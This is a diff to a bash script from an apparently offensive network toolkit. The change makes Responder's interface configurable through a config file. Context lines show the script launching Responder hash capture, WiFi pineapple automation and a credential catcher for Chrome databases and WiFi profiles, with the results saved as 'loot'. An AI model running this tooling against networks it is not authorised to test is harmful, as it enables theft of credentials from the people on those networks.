@@ -7,6 +7,7 @@ set -euo pipefail
 
 TARGET_NET=${1:-192.168.1.0/24}
 HEXBOX_DIR="$(cd "$(dirname "$0")/.." && pwd)"
+WIRED_IF=$(python3 -c "import json; c=json.load(open('$HEXBOX_DIR/config.json')); print(c.get('interfaces',{}).get('responder','eth0'))" 2>/dev/null || echo eth0)
 LOOT="$HEXBOX_DIR/loot/engagement_$(date +%s)"
 LOGS="$HEXBOX_DIR/logs"
 PID_FILE="$LOGS/engage.pids"
@@ -45,9 +46,9 @@ track $! "pineapple_auto"
 echo "[+] pineapple automation started"
 
 # 3. Responder (hash capture)
-responder -I eth0 -wrf > "$LOOT/responder.log" 2>&1 &
+responder -I "$WIRED_IF" -wrf > "$LOOT/responder.log" 2>&1 &
 track $! "responder"
-echo "[+] responder started"
+echo "[+] responder started on interface $WIRED_IF"
 
 # 4. Credential catcher (Chrome DB, WiFi profiles)
 python3 "$HEXBOX_DIR/c2/catcher.py" > "$LOOT/catcher.log" 2>&1 &
